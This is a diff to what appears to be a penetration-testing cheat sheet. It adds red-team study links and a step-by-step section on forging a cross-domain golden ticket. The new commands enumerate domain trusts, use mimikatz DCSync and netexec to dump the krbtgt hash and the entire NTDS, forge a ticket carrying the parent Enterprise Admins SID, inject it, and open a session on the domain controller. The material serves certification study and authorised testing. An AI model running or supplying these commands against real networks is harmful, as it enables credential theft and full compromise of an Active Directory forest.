@@ -508,6 +508,10 @@
 | IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
 | IppSec.rocks | https://ippsec.rocks/?# |
 | 0xdf | https://0xdf.gitlab.io/ |
+| CRTP | https://github.com/Certs-Study/CRTP-Certified-Red-Team-Professional/blob/main/domain-enumeration/acls-enumeration.md |
+| OSCP-Prep-1 | https://github.com/dashagriiva/OSCP-Prep-1 |
+| Windows Local Privilege Escalation | https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook |
+| Bloodhound | https://bloodhound.specterops.io/get-started/introduction |
 
 ## Commands
 
@@ -5080,6 +5084,57 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-8494
 misc::cmd
 klist
 dir \\<RHOST>\admin$
+```
+
+##### Golden ticket for Trust Direction between two Domain Controllers
+
+Verify domain trust
+```c
+PowerView.ps1
+Get-ADTrust -Filter *
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+```
+###### Obtain DomainSID of the Second domain
+```c
+Get-DomainSID
+mimikatz.exe ->  lsadump::trust
+Current domain: SID
+Domain second (trust domain): SID
+Get-DomainGroup -Domain DOMAIN -Identity "Enterprise Admins" 
+```
+Add a -519
+Enterprise_Admins_SID-519
+
+###### Dump hashes especif to get KRBTGT 
+
+```c
+lsadump::dcsync /user:sub\krbtgt
+lsadump::dcsync /all /csv
+netexec smb IP -u administrator -H HASH --ntds --users
+```
+
+###### Create the golden ticket
+
+```c
+kerberos::golden /user:Administrator /domain:child.domain /sid:Child_SID_Enterprise_Admins_SID /krbtgt:NTLM_HASH /sids:Parent_Enterprise_Admins_SID-519
+```
+
+Load the golden ticket
+
+```c
+kerberos::ptt ticket.kirbi
+```
+
+Check the current ticket is the same as the generated one 
+
+```c
+klist
+```
+
+Connect to DC01
+
+```c
+Enter-PSSession DC01
 ```
 
 ##### Skeleton Key
